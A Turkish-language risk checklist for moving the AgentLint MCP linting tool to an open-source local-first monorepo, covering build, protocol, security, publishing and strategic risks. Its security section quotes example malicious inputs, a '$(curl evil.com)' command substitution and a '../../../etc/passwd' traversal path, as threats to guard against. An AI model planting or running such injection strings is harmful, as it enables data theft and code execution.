# Dikkat Edilecekler: AgentLint OSS Pivot Riskleri & Kritik Noktalar

> Bu doküman, SaaS → OSS Local-First pivot sürecinde karşılaşılabilecek riskleri, tuzakları ve kritik dikkat noktalarını kapsar.

---

## 1. Monorepo Geçiş Riskleri

### 1.1 — Import Spaghetti

**Risk**: Mevcut codebase'de modüller arası çapraz bağımlılıklar (circular imports) monorepo paketlerine bölünürken kırılabilir.

**Belirtiler**:
- `artifact-analyzer.ts` → `mcp/types.ts` → `lib/artifacts.ts` → `artifact-analyzer.ts` döngüsü
- Build sırasında `Maximum call stack` veya `Cannot access before initialization` hataları

**Önlem**:
- Taşıma öncesi `madge` veya `dependency-cruiser` ile bağımlılık grafı çıkar
- `packages/shared`'ı her zaman **ilk** taşı — ortak tipler burada olmalı
- Hiçbir paket doğrudan başka paketin `src/` dizinine referans vermemeli, sadece export'lara

### 1.2 — TypeScript Project References

**Risk**: `composite: true` + `references` konfigürasyonu ilk seferde düzgün çalışmayabilir. IDE'de kırmızı çizgiler, build'de "file not found" hataları.

**Önlem**:
- Her paketi taşıdıktan sonra `tsc --noEmit` çalıştır
- `tsconfig.json` dosyalarını küçük adımlarla yapılandır
- `paths` alias'ları yerine gerçek package import'larını kullan (`@agent-lint/core`)

### 1.3 — Test Kopması

**Risk**: Mevcut testler `src/` yapısına göre yazılmış olabilir; monorepo'ya geçince path'ler kırılır.

**Önlem**:
- Faz 0 sonunda **tüm mevcut testlerin geçtiğini** doğrula
- Test fixture path'lerini relative tutmak yerine `__dirname` bazlı yap
- Vitest workspace config'ini monorepo'ya uyumlu hale getir

---

## 2. MCP Protokol Riskleri

### 2.1 — stdout Kirliliği (KRİTİK)

**Risk**: MCP stdio transport, `stdin`/`stdout` üzerinden JSON-RPC iletişimi yapar. Herhangi bir `console.log()`, debug print, veya exception stack trace'i stdout'a yazılırsa **MCP protokolü bozulur**.

**Belirtiler**:
- Client "parse error" veya "invalid JSON" hatası alır
- Bağlantı sessizce kopar
- Aralıklı, debug edilmesi zor hatalar

**Önlem**:
- `console.log` kullanımını **tamamen yasakla** (ESLint rule ile enforce et)
- Tüm logging → `console.error()` veya custom stderr logger
- Global exception handler ekle: uncaught exception'ları stderr'e yaz, stdout'u temiz tut
- `process.on('uncaughtException', (err) => { console.error(err); process.exit(1); })`
- CI'da `grep -r "console.log" packages/` kontrolü

### 2.2 — MCP SDK Versiyon Uyumsuzluğu

**Risk**: `@modelcontextprotocol/sdk` hızla gelişen bir paket. Mevcut kodda kullanılan API'ler deprecate edilebilir.

**Önlem**:
- SDK versiyonunu `package.json`'da pin'le (exact version, `^` değil)
- Major versiyon güncellemelerinde changelog'u kontrol et
- Breaking change'lere karşı entegrasyon testleri yaz

### 2.3 — Tool Schema Kırılması

**Risk**: MCP tool schema'ları (Zod ile tanımlanan input/output) değiştiğinde, mevcut client konfigürasyonları kırılır.

**Önlem**:
- Tool schema'larını versiyonla
- Breaking change'lerde major versiyon bump yap
- Schema değişikliklerini `CHANGELOG.md`'de açıkça belirt

### 2.4 — Büyük Workspace Timeout

**Risk**: `scan_workspace` tool'u büyük monorepo'larda (10K+ dosya) çok yavaşlayabilir veya timeout olabilir.

**Önlem**:
- Glob pattern'lerinde `.gitignore` ve `node_modules` exclusion'ı varsayılan yap
- Tool timeout'u 60s ile sınırla
- Progressive reporting: ilk N artifact bulunduğunda partial sonuç dön
- `.agentlintrc` ile tarama kapsamını daraltma opsiyonu sun

---

## 3. Güvenlik Riskleri

### 3.1 — apply_patches Path Traversal

**Risk**: Kötü niyetli bir patch `../../../etc/passwd` veya `C:\Windows\System32\...` gibi bir path hedefleyebilir.

**Önlem**:
- Path'i `path.resolve()` ile normalize et
- Hedef path'in working directory **içinde** olduğunu doğrula
- Symlink'leri takip etme (`lstat` kullan, `stat` değil)
- Null byte injection kontrolü (`\0` içeren path'leri reddet)
- Windows'ta drive letter kontrolü (hedef ile kaynak aynı drive'da olmalı)

### 3.2 — Hash Mismatch Race Condition

**Risk**: Hash kontrolü ile yazma arasında dosya başka bir process tarafından değiştirilebilir (TOCTOU — Time of Check to Time of Use).

**Önlem**:
- Lock file mekanizması (basit `.lock` dosyası)
- Yazma sonrasında tekrar hash kontrolü
- Atomik yazma: temp dosyaya yaz, sonra rename

### 3.3 — Malicious Artifact İçeriği

**Risk**: Analiz edilen artifact içinde `{{env.SECRET}}`, `$(curl evil.com)`, veya shell injection pattern'leri olabilir.

**Önlem**:
- Mevcut `sanitize.ts` kullanılıyor — ancak double-check et
- Artifact içeriğini asla `eval()`, `exec()`, veya shell command olarak çalıştırma
- Analiz motoru zaten read-only — bu garantiyi koru

### 3.4 — Supply Chain Attack

**Risk**: `npx -y @agent-lint/mcp` çalıştırıldığında dependency chain'deki herhangi bir paket kötü amaçlı olabilir.

**Önlem**:
- Minimum bağımlılık politikası (her yeni dep için gerekçe)
- `npm audit` CI'da zorunlu
- `package-lock.json` commit et
- npm provenance (sigstore) aktifleştir
- Periyodik dependency review

---

## 4. DX (Developer Experience) Riskleri

### 4.1 — Cold Start Süresi

**Risk**: `npx -y @agent-lint/mcp` ilk çalıştırmada npm indirme + Node.js başlatma > 10s olabilir.

**Önlem**:
- Paket boyutunu < 5MB tut (unpacked)
- Tree-shaking ve bundle optimization (`tsup` veya `esbuild`)
- Gereksiz dev dependency'leri publish etme (`"files"` alanını doğru ayarla)
- İlk çalıştırma sonrası npm cache devreye girer — soğuk başlama sadece ilk sefer

### 4.2 — Node.js Versiyon Uyumsuzluğu

**Risk**: Kullanıcının Node.js versiyonu eski (< 18) olabilir. `import` syntax, `fetch` API, `structuredClone` gibi modern API'ler çalışmaz.

**Önlem**:
- `"engines": { "node": ">=18" }` zorunlu
- `bin` script'inde versiyon kontrolü yap ve anlamlı hata mesajı göster
- Node 18 LTS'te mevcut olmayan API'leri kullanma (Node 20+ özelliklerinden kaçın)

### 4.3 — Windows Uyumluluk Sorunları

**Risk**: Path separator (`\` vs `/`), line ending (`\r\n` vs `\n`), symlink davranışı, PowerShell quoting farklılıkları.

**Önlem**:
- Tüm path işlemlerinde `path.join()` / `path.resolve()` kullan (hardcoded `/` yok)
- `\r\n` → `\n` normalize et (özellikle diff/patch'te)
- CI'da Windows runner ekle (GitHub Actions: `runs-on: windows-latest`)
- PowerShell'de `npx` quoting test et
- `.gitattributes` ile line ending kontrolü

### 4.4 — Config Karmaşıklığı

**Risk**: `.agentlintrc` çok fazla opsiyon içerirse kullanıcılar bunalır. "Zero-config" vaadini bozar.

**Önlem**:
- Sane defaults: config dosyası olmadan da çalışmalı
- `agent-lint init` ile interaktif config oluşturma
- Progressive disclosure: basit config → advanced config
- Config validation (Zod schema) ile hatalı config'de anlamlı hata mesajı

---

## 5. Publish & Dağıtım Riskleri

### 5.1 — npm Scope Mevcut mu?

**Risk**: `@agent-lint` npm scope'u alınmamış olabilir.

**Önlem**:
- npm'de `@agent-lint` scope'unu **hemen** claim et
- Alternatif: `@agentlint`, `agent-lint` (unscoped)
- Scope claim edilemezse plan B hazırla

### 5.2 — Accidental Publish

**Risk**: SaaS kodu henüz temizlenmeden, API key'ler veya private kod publish edilebilir.

**Önlem**:
- `"files"` alanını açıkça tanımla (whitelist yaklaşımı)
- `npm pack --dry-run` ile publish edilecek dosyaları kontrol et
- `.npmignore` yerine `"files"` kullan (daha güvenli)
- `prepublishOnly` script'inde `grep -r "OPENAI_API_KEY\|ANTHROPIC_API_KEY" dist/` kontrolü
- İlk publish'i `--dry-run` ile dene

### 5.3 — Versiyon Stratejisi

**Risk**: Monorepo'da birden fazla paketin versiyon yönetimi karmaşıklaşabilir.

**Önlem**:
- `changesets` veya `lerna-lite` kullan
- Semantic versioning: breaking change = major, feature = minor, fix = patch
- İlk release: `0.1.0` (pre-1.0, API değişebilir sinyali)
- `@agent-lint/mcp` ve `@agent-lint/cli` aynı major versiyonda tutulmalı

---

## 6. Stratejik Riskler

### 6.1 — "Extract & Repackage" Tuzağı

**Risk**: "Zaten var, sadece taşıyoruz" yaklaşımı gerçekte beklenenden çok daha fazla refactor gerektirebilir. Mevcut kod SaaS bağlamında çalışacak şekilde yazılmış; izole paketlerde farklı davranabilir.

**Önlem**:
- Her taşınan modül için bağımsız çalışma testi yaz
- "Taşı ve test et" döngüsü: asla birden fazla modülü test etmeden taşıma
- Zaman tahminlerini 1.5x buffer ile yap

### 6.2 — Feature Creep

**Risk**: Pivot sırasında "bunu da ekleyelim" dürtüsü (custom rules, plugin sistemi, watch mode, VS Code extension) timeline'ı patlatabilir.

**Önlem**:
- Faz 0-5 = MVP. Faz 6 = opsiyonel genişleme. Bu sınırı KORU.
- Yeni özellik taleplerine "v0.2 backlog" etiketi at
- MVP tanımı: `npx -y @agent-lint/mcp` çalışıyor + `npx @agent-lint/cli analyze` çalışıyor + testler yeşil

### 6.3 — Backwards Compatibility

**Risk**: Mevcut SaaS kullanıcıları (varsa) pivottan etkilenebilir.

**Önlem**:
- Mevcut SaaS versiyon'u bir süre paralel tutulabilir mi değerlendir
- Büyük ihtimalle henüz aktif kullanıcı yok → agresif pivot güvenli
- Yine de mevcut `server.json` ve MCP config'leri kırılmamalı

### 6.4 — Rakip Analizi

**Risk**: Context7 veya başka bir araç benzer bir "artifact linting" özelliği eklerse, USP (unique selling proposition) kaybolur.

**Önlem**:
- Context7 doküman servisi yapar, AgentLint kalite kontrolü yapar — farklı katmanlar
- Hız avantajı: **şimdi** pivot yap, ilk ol
- Niş odak: "AI agent context artifacts" çok spesifik bir niş — koruyucu hendek
- Entegrasyon: Context7 ile rakip değil, tamamlayıcı ol (Context7 docs, AgentLint quality)

---

## 7. Operasyonel Riskler

### 7.1 — CI/CD Pipeline Eksikliği

**Risk**: Testler lokal geçer ama CI'da farklı ortam (Linux/macOS/Windows) yüzünden başarısız olur.

**Önlem**:
- GitHub Actions matrix: `[ubuntu-latest, windows-latest, macos-latest]` × `[node-18, node-20, node-22]`
- CI'da `npm ci` kullan (`npm install` değil)
- Lockfile uyumsuzluğu CI'ı kırar — bu iyi bir şey

### 7.2 — Tek Kişilik Bus Factor

**Risk**: Projeyi tek kişi yürütüyorsa, o kişinin engeli = projenin durması.

**Önlem**:
- Kod kalitesi ve dokümantasyon başından sağlam tutulmalı
- `CONTRIBUTING.md` erken yazılmalı
- Automated release pipeline kurulmalı (manual step minimize)

### 7.3 — Dokümantasyon Eskimesi

**Risk**: Kod değişir, dokümanlar değişmez. README'deki örnekler kırık, tool isimleri eski.

**Önlem**:
- README'deki code block'ları test et (doctest veya CI script)
- Doküman güncellemesini PR checklist'e ekle
- `great_plan.md` ve diğer planlama dokümanlarını faz tamamlandıkça güncelle

---

## 8. Kritik Karar Noktaları (Ters Giderse Dur ve Değerlendir)

| Durum | Aksiyon |
|-------|---------|
| Faz 0 sonunda `tsc --noEmit` başarısız | Circular dep'leri çözmeden Faz 1'e geçme |
| `npx` cold start > 5s | Bundle optimization yap, dep sayısını azalt |
| `apply_patches` güvenlik testi başarısız | Tool'u kaldır, sadece `propose_patches` tut |
| npm `@agent-lint` scope alınamıyor | Alternatif isim kararı al, tüm dokümanları güncelle |
| MCP Inspector'da tool'lar görünmüyor | SDK versiyon uyumluluğunu kontrol et |
| Windows CI kırmızı | Path normalization ve line ending'leri düzelt |
| Paket boyutu > 10MB | Dependency audit, gereksiz dosyaları `files`'dan çıkar |
